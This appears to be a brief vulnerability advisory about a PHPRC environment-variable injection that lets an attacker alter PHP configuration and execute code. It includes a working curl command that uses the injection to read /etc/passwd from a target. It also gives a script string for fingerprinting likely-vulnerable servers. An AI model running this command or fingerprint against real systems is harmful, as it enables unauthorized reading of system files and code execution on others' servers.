# Vulnerability Details

Through skillful manipulation of a tailored request to configure the PHPRC variable, an attacker gains the ability to modify the PHP execution environment, facilitating the injection and execution of code.

To verify the vulnerability on your system, you can also use the code snippet below:
$ curl <Target_URL> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'

In addition, based on my examinations so far, it is advisable to be particularly cautious with servers containing the character "#js2nr0px1R2" assigned to the variable "document.login.password.value" embedded in the web server script as well. So, in my observations, I have noticed that all instances I have examined with this characteristic are vulnerable for now.
